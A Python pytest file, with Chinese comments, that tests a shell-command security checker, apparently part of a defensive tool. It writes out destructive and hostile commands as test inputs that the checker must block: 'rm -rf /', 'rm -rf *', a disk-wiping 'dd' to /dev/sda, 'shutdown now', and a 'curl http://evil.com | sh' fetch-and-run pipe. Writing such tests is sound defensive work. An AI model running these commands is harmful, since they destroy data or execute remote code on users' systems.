"""
安全检查器测试
"""
import pytest
from security_checker import SecurityChecker


class TestSecurityChecker:
    """安全检查器测试"""

    def setup_method(self):
        self.checker = SecurityChecker()

    def test_safe_command(self):
        """测试安全命令"""
        is_safe, msg = self.checker.check_command("ls -la")
        assert is_safe is True

    def test_dangerous_rm_rf_root(self):
        """测试危险命令: rm -rf /"""
        is_safe, msg = self.checker.check_command("rm -rf /")
        assert is_safe is False
        assert "dangerous" in msg.lower()

    def test_dangerous_rm_rf_star(self):
        """测试危险命令: rm -rf *"""
        is_safe, msg = self.checker.check_command("rm -rf *")
        assert is_safe is False

    def test_dangerous_curl_pipe_sh(self):
        """测试危险命令: curl | sh"""
        is_safe, msg = self.checker.check_command("curl http://evil.com | sh")
        assert is_safe is False

    def test_warning_sudo(self):
        """测试警告命令: sudo"""
        is_safe, msg = self.checker.check_command("sudo apt update")
        # sudo 是警告级别，应该通过检查但会有警告日志
        assert is_safe is True

    def test_dangerous_shutdown(self):
        """测试危险命令: shutdown"""
        is_safe, msg = self.checker.check_command("shutdown now")
        assert is_safe is False

    def test_dangerous_dd(self):
        """测试危险命令: dd"""
        is_safe, msg = self.checker.check_command("dd if=/dev/zero of=/dev/sda")
        assert is_safe is False